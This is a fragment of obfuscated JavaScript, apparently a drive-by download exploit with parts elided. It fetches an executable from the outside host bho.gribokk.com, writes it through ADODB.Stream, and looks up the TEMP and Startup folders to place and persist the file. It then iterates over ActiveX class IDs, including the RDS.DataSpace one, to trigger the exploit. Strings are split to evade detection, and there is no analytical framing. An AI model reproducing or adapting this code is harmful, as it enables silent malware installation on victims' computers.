...
var exes="\\anjwsoinhj.exe"
var url="http://bho.gribokk.com/exe.php?pid=1026&filter=off";
var stxml="XML";var stgt="GET";var std="D";var ldobj=null;
try{ldobj=objmker(lev3par1,"Microsoft."+stxml+"HTTP");ldobj.open(stgt,url,false);}catch(e){try{ldobj=objmker(lev3par1,"MS"+stxml+"2."+stxml+"HTTP");ldobj.open(stgt,url,false);
}catch(e){try{ldobj=objmker(lev3par1,"MS"+stxml+"2.Server"+stxml+"HTTP");ldobj.open(stgt,url,false);}catch(e){try{ldobj=new XMLHttpRequest();ldobj.open(stgt,url,false);}catch(e){return 0;}}}}
try{ldobj.send(null);}catch(e){try{ldobj.send(null);}catch(e){return 0;};};ldbody = ldobj.responseBody;var obj_strm=objmker(lev3par1,"A"+std+"O"+std+"B.Stream");if(obj_strm){obj_strm.Type=1;obj_strm.Mode=3;obj_strm.Open();obj_strm.Write(ldbody);var hdrive="";var dtemp="";var dstart="";var daustart="";try{var obj_WScript=objmker(lev3par1,"WScript.Shell");try{var wshProcEnv=obj_WScript.Environment("PROCESS");hdrive=wshProcEnv("HOMEDRIVE");dtemp=wshProcEnv("TEMP");}catch(e){};try{dstart=obj_WScript.SpecialFolders("Startup");daustart=obj_WScript.SpecialFolders("AllUsersStartup");}catch(e){};}catch(e){};
...
Array(
"{BD96C"+"556-65A"+"3-11D0-9"+"83A-00C04"+"FC2"+"9E36}",
...
while(hncx[i]){
var iuump=null;if(hncx[i].substring(0,1)=="{"){iuump=document.createElement("object"); iuump.setAttribute("id","obj_RDS"+i); iuump.setAttribute("classid","clsid:"+hncx[i].substring(1,hncx[i].length-1));}
if(iuump){try{if(lsrn(iuump)){break;};}catch(e){}}i++;} 
